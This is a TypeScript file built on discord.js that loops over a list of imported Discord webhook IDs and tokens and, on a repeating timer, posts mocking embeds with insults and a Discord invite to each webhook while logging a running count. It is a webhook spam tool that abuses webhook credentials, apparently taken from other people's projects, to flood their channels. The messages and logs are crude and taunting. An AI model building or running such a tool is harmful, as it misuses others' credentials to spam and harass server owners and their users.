"use strict";

import { EmbedBuilder, WebhookClient } from "discord.js";
import { tokens } from "./tokens";

let counter: number = 0;
let gigachad1: string =
  "https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Fi1.wp.com%2Fmelmagazine.com%2Fwp-content%2Fuploads%2F2021%2F01%2FGigachad.jpg&f=1&nofb=1&ipt=a2f36fe31703152ccaa5d1be79c603c7113453661abb8b13dcf5ef5b9a8f6860&ipo=images";
let gigachad2: string =
  "https://external-content.duckduckgo.com/iu/?u=http%3A%2F%2Fi0.kym-cdn.com%2Fphotos%2Fimages%2Foriginal%2F001%2F370%2F940%2F66f.jpg&f=1&nofb=1&ipt=23da9fc4d9b75fac38d794f6f6b84381c645275fc6969217ab99b310cc7c38f3&ipo=images";

export default async function init(timer: number) {
  console.log("[Webhook Succ] ==> Getting ready to do the fucky!");

  tokens.forEach(async (i: any) => {
    console.log(`[Webhook Succ] ==> Looping through webhook tokens`, i);

    setInterval(async () => {
      console.log("[Webhook Succ] ==> Created webhook client");
      counter++;

      let webhookClient = new WebhookClient({
        id: i.id,
        token: i.token,
      });

      let embed = new EmbedBuilder()
        .setAuthor({
          name: "better than u",
          iconURL: gigachad2,
        })
        .setTitle("Yikes! im inside ur mom")
        .setDescription(
          "Bruh you gotta be smarter than this. Do you need some help? Do you know what a backend is? Join, we will show u da way! https://discord.gg/http"
        )
        .setColor("#ff0000");

      await webhookClient
        .send({
          content: `Sent ${counter} messages!`,
          username: "ur mom",
          avatarURL: gigachad1,
          embeds: [embed],
        })
        .catch((e) => {
          return console.error(e);
        });

      console.log(`[Webhook Succ] ==> Sent shit to ${i.id}`);

      return console.log(
        `[Webhook Succ] ==> Sent ${counter} total webhook messages.`
      );
    }, timer);
  });
}
